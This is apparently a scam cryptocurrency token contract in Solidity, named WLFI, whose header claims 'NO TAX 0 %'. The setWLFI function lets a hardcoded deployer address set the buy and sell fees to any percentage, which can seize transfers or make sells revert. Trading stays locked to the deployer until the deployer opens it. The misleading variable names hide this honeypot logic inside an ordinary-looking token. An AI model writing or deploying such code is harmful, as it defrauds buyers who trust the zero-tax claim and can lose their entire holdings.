/*

The most asked question in the universe is WLFI?

NO TAX 0 %


*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

contract WLFI {
    string public constant name = "WLFI";
    string public constant symbol = "WLFI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 BurnAmount = 0;
    uint256 ConfirmAmount = 0;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
        
    error Permissions();
        
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address private pair;
    address payable constant deployer = payable(address(0x800078c2c328F22c8Df7a16b639a0daE629E176b));

    bool private tradingOpen;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(tradingOpen || from == deployer || to == deployer);

        if(!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if(from != address(this)){
            uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 100;
            amount -= FinalAmount;
            balanceOf[address(this)] += FinalAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer);
        require(!tradingOpen);
        tradingOpen = true;        
    }

    function setWLFI (uint256 newBurn, uint256 newConfirm) external {
        require(msg.sender == deployer);
        BurnAmount = newBurn;
        ConfirmAmount = newConfirm;
    }
}